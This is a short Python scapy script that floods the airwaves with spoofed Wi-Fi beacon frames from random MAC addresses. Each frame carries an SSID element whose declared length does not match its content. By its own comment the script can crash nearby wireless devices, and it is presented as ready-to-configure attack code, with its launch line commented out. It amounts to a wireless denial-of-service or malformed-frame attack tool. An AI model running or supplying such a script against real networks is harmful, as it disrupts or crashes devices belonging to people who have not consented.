from scapy.all import *

# config your stuff here
iface = 'wlan1'
sender = RandMAC()

# send raw wifi beacon frames
def beacon_raw(SSID, length=255):
	dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=RandMAC(), addr3=RandMAC())
	beacon = Dot11Beacon()
	essid = Dot11Elt(ID='SSID',info=RawVal(SSID), len=length)
	frame = RadioTap()/dot11/beacon/essid
	print(f"{SSID}")
	sendp(frame, iface=iface, inter=0.250, loop=1)

ssid_binary = 0b0101 # a few random bits to send as the SSID

# please be careful with this, it can crash your local wifi devices
# beacon_raw(ssid_binary, length=255) # send it